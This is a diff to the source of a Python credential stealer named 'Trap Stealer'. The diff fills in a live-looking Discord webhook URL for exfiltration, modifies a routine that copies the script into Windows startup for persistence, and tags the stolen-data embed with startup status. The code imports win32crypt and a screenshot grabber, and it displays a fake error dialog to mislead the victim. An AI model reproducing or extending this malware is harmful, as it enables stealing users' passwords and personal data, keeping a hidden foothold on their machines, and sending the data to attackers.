@@ -19,19 +19,18 @@ import subprocess
 import json, socket, win32crypt, getpass, ctypes
 from PIL import ImageGrab
 
-
-
 ### CONFIG ### 
 shitty_message = True # If True it will print fake message, if you want to disable it replace with False
 fakeerror = True # If True it will make an fake error message at the end
-webhook = '' #Put ur webhook
+webhook = 'https://discord.com/api/webhooks/1101543501818241147/6_bZynYH6pmIomJN2tiVsDFXFndJoiMLwCO0Ixhu2a9aAThKqRQOUh-WirRZYNH8DawP' #Put ur webhook
+Startup = 'Dont mind this'
+
 if shitty_message == True:
     print('Importing Module...')
 else:
     pass
 file_path = os.path.realpath(__file__)
 USER_NAME = getpass.getuser()
-
 
 def add_to_startup(py_file_path=file_path, bat_file_path=None):
     if not bat_file_path:
@@ -50,22 +49,23 @@ def add_to_startup(py_file_path=file_path, bat_file_path=None):
     # Replace  with an empty string in the copied file
     with open(bat_file_path, "r", encoding="utf-8") as f:
         contents = f.read()
-    contents = contents.replace("", "")
+    contents = contents.replace("add_to_startup()", "")
     with open(bat_file_path, "w", encoding="utf-8") as f:
         f.write(contents)
 
+    with open(bat_file_path, "r", encoding="utf-8") as f:
+        contents = f.read()
+
+# Replace the code block with a pass statement
     contents = contents.replace('if fakeerror == True:\n    ctypes.windll.user32.MessageBoxW(0, "Error, Restart...", "Retry!", 16)\nelse:pass', 'pass')
+
+    # Write the updated contents back to the file
     with open(bat_file_path, "w", encoding="utf-8") as f:
         f.write(contents)
 
-    contents = contents.replace('if fakeerror == False:\n    ctypes.windll.user32.MessageBoxW(0, "Error, Restart...", "Retry!", 16)\nelse:pass', 'pass')
-
-    with open(file_path, "w", encoding="utf-8") as f:
-        f.write(contents)
 
 
 add_to_startup()
-
 
 
 
@@ -465,7 +465,7 @@ data = {
     "embeds": [
         {
             "title": "🍪 Trap Stealer Information",
-            "description": f"{globalinfo}\n",
+            "description": f"{globalinfo}\nStartup : {Startup}",
             "color": 0xffb6c1,
             "thumbnail": {
                 "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
